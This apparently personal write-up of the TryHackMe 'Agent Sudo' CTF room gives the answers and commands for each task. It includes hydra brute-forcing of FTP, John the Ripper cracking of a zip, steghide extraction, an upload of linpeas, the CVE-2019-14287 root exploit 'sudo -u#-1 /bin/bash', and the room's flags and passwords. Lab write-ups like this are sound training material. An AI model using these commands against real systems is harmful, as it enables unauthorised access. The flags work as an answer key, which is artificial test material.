
#Agent-Sudo

```
export IP=10.10.103.171
```

#Task 1 Author note

Welcome to another THM exclusive CTF room. Your task is simple, capture the flags just like the other CTF room. Have Fun!

If you are stuck inside the black hole, post on the forum or ask in the TryHackMe discord.

1. Deploy the machine
```
NO answer needed
```

#Task 2 Enumerate

Enumerate the machine and get all the important information
 	

1. How many open ports?

```
3
```

3.How you redirect yourself to a secret page?

```
User-Agent  (curl http://$IP -H "User-Agent: C" -L)
```

3. What is the agent name?
```
Chris
```

#Task 3 Hash cracking and brute-force

Done enumerate the machine? Time to brute your way out.

1. FTP password
```bash
crystal  (via hydra : hydra -l chris -P /usr/share/wordlists/rockyou.txt ftp://$IP)
```
	
2. Zip file password
```
alien (binwalk e pngfile,zip2john e num.zip>hash.txt,john hash.txt --wordlist=rockyou.txt AND unzipped with #7z e num.zip)
```
	
3. steg password
```
Area51 (from the message in above unzipped file..decoded a base64 string)
``` 	

4. Who is the other agent (in full name)?
```
james (steghide extract -sf jpgfile ,Got his name and password for chris login)
```	

5. SSH password
```
hackerrules!
```

#Task 4 Capture the user flag

You know the drill.

1. What is the user flag?
```
b03d975e8c92a7c04146cfa7a5a313c7 (from the ssh login as chris)
```
	
2. What is the incident of the photo called?
```
Roswell alien autopsy (scp james@$IP:/home/james/Alien_autospy.jpg . #To download the jpgfile to our system and searched it with google image search)
```

#Task 5 Privilege escalation

Enough with the extraordinary stuff? Time to get real.
 	

1. CVE number for the escalation 

(Format: CVE-xxxx-xxxx)
```
cve-2019-14287 (scp /home/safan/linpeas/linpeas.sh james@$IP:/dev/shm and through sudo -l command we got  "(ALL, !root) /bin/bash" and googled it)
```
	
2. What is the root flag?
```
b53a02f55b57d4439e3341834d70c062
(got the root privilege by CVE*** bug using this "sudo -u#-1 /bin/bash")
``` 	

3. (Bonus) Who is Agent R?
```
Deskel (with the message of root.txt)
```




